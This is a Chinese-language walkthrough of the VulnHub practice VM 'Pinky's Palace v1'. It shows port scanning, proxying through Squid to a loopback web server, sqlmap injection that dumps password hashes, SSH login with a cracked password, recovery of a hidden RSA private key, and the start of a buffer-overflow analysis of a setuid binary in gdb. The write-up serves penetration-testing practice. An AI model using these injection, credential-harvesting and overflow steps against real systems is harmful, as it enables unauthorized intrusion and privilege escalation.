# Pinkys Palace v1

> https://download.vulnhub.com/pinkyspalace/Pinkys-Palace.ova
>
> vm box

靶场IP：`192.168.32.9`

![image-20220720155302932](../../.gitbook/assets/image-20220720155302932.png)

扫描对外端口

```
┌──(root㉿kali)-[~]
└─# nmap -p1-65535 -sV 192.168.32.9
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 03:56 EDT
Nmap scan report for 192.168.32.9
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
31337/tcp open  http-proxy Squid http proxy 3.5.23
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
MAC Address: 08:00:27:77:F4:3C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds

```

浏览器访问

![image-20220720155529594](../../.gitbook/assets/image-20220720155529594.png)

![image-20220720155514965](../../.gitbook/assets/image-20220720155514965.png)

需要使用squid访问环回地址才可以不被拦截

```
┌──(root㉿kali)-[~]
└─# curl http://127.0.0.1:8080 -x 192.168.32.9:31337
<html>
        <head>
                <title>Pinky's HTTP File Server</title>
        </head>
        <body>
                <center><h1>Pinky's HTTP File Server</h1></center>
                <center><h3>Under Development!</h3></center>
        </body>
<style>
html{
        background: #f74bff;
}
</html>

```

![image-20220720155833164](../../.gitbook/assets/image-20220720155833164.png)

![image-20220720162641466](../../.gitbook/assets/image-20220720162641466.png)

使用dirbuster，配置HTTP代理进行爆破

![image-20220720161357753](../../.gitbook/assets/image-20220720161357753.png)

![image-20220720161302188](../../.gitbook/assets/image-20220720161302188.png)

找到`/littlesecrets-main`目录

![image-20220720161501668](../../.gitbook/assets/image-20220720161501668.png)

访问目录

![image-20220720162708491](../../.gitbook/assets/image-20220720162708491.png)

使用sqlmap

```
┌──(root㉿kali)-[~]
└─# sqlmap –proxy=http://192.168.32.9:31337 –dbms=mysql –data="user=admin&pass=pwd&submit=Login" –url http://127.0.0.1:8080/littlesecrets-main/login.php –level=5 –risk=3
```

![image-20220720163315828](../../.gitbook/assets/image-20220720163315828.png)

导出用户表

```
┌──(root㉿kali)-[~]
└─# sqlmap –proxy=http://192.168.32.9:31337 –dbms=mysql –data="user=admin&pass=pwd&submit=Login" –url http://127.0.0.1:8080/littlesecrets-main/login.php –level=5 –risk=3 –dump -D pinky_sec_db -T users

Database: pinky_sec_db
Table: users
[2 entries]
+-----+----------------------------------+-------------+
| uid | pass                             | user        |
+-----+----------------------------------+-------------+
| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
+-----+----------------------------------+-------------+

```

> https://crackstation.net/

`pinkymanage/3pinkysaf33pinkysaf3`

![image-20220720164752649](../../.gitbook/assets/image-20220720164752649.png)

ssh进行登录

```
┌──(root㉿kali)-[~]
└─# ssh pinkymanage@192.168.32.9 -p64666
The authenticity of host '[192.168.32.9]:64666 ([192.168.32.9]:64666)' can't be established.
ED25519 key fingerprint is SHA256:QUuapQBImuyyLZ2XEorKhwl3PUB551ZknLzOB7sXerY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.32.9]:64666' (ED25519) to the list of known hosts.
pinkymanage@192.168.32.9's password: 
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 04:00:51 2018 from 127.0.0.1
pinkymanage@pinkys-palace:~$ id
uid=1001(pinkymanage) gid=1001(pinkymanage) groups=1001(pinkymanage)

```

找到私钥文件

```
pinkymanage@pinkys-palace:~$ cd /var/www/html/
pinkymanage@pinkys-palace:/var/www/html$ ls
index.html  littlesecrets-main
pinkymanage@pinkys-palace:/var/www/html$ cd littlesecrets-main/
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ls
index.html  login.php  logs.php  ultrasecretadminf1l35
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ cd ultrasecretadminf1l35/
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ls
note.txt
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat note.txt 
Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Feb  2  2018 .
drwxr-xr-x 3 root root 4096 Feb  2  2018 ..
-rw-r--r-- 1 root root   99 Feb  2  2018 note.txt
-rw-r--r-- 1 root root 2270 Feb  2  2018 .ultrasecret
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat .ultrasecret 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

```

解码私钥

```
┌──(root㉿kali)-[/tmp]
└─# cat .ultrasecret | base64 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
-----END RSA PRIVATE KEY-----
                               
```

使用私钥进行登录

```
┌──(root㉿kali)-[/tmp]
└─# ssh -i key pinky@192.168.32.9 -p 64666
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 05:54:01 2018 from 172.19.19.2
pinky@pinkys-palace:~$ 

```

查看当前目录信息

```
pinky@pinkys-palace:~$ cat note.txt 
Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
pinky@pinkys-palace:~$ ./adminhelper 

```

> 当我需要做管理员任务时，我一直在开发这个程序来帮助我。sudo太难配置了，我永远记不住我的根密码！可悲的是，我对C相当陌生，所以我正在学习打印技能，因为我还不确定如何实现shell生成：(

输入100个字符，发现存在缓冲区溢出漏洞

```
pinky@pinkys-palace:~$ ./adminhelper $(python -c "print('A'*100)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

找到存在缓冲区溢出**偏移量**

```
┌──(root㉿kali)-[~]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
pinky@pinkys-palace:~$ gdb -q adminhelper
Reading symbols from adminhelper...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/pinky/adminhelper Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554854 in main ()
```



```
pinky@pinkys-palace:~$ gdb -q adminhelper
Reading symbols from adminhelper...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/pinky/adminhelper Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                          
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                
                                                                                                                    
Program received signal SIGSEGV, Segmentation fault.                                                                
0x0000555555554854 in main ()    
```

```
(gdb) disassemble spawn
Dump of assembler code for function spawn:
   0x00005555555547d0 <+0>:     push   %rbp
   0x00005555555547d1 <+1>:     mov    %rsp,%rbp
   0x00005555555547d4 <+4>:     sub    $0x10,%rsp
   0x00005555555547d8 <+8>:     movl   $0x0,-0x4(%rbp)
   0x00005555555547df <+15>:    movl   $0x0,-0x8(%rbp)
   0x00005555555547e6 <+22>:    mov    -0x4(%rbp),%eax
   0x00005555555547e9 <+25>:    mov    %eax,%edi
   0x00005555555547eb <+27>:    callq  0x555555554680 <seteuid@plt>
   0x00005555555547f0 <+32>:    mov    -0x8(%rbp),%eax
   0x00005555555547f3 <+35>:    mov    %eax,%edi
   0x00005555555547f5 <+37>:    callq  0x555555554670 <setegid@plt>
   0x00005555555547fa <+42>:    mov    $0x0,%edx
   0x00005555555547ff <+47>:    mov    $0x0,%esi
   0x0000555555554804 <+52>:    lea    0xd9(%rip),%rdi        # 0x5555555548e4
   0x000055555555480b <+59>:    callq  0x555555554660 <execve@plt>
   0x0000555555554810 <+64>:    nop
   0x0000555555554811 <+65>:    leaveq 
   0x0000555555554812 <+66>:    retq   
End of assembler dump.

```

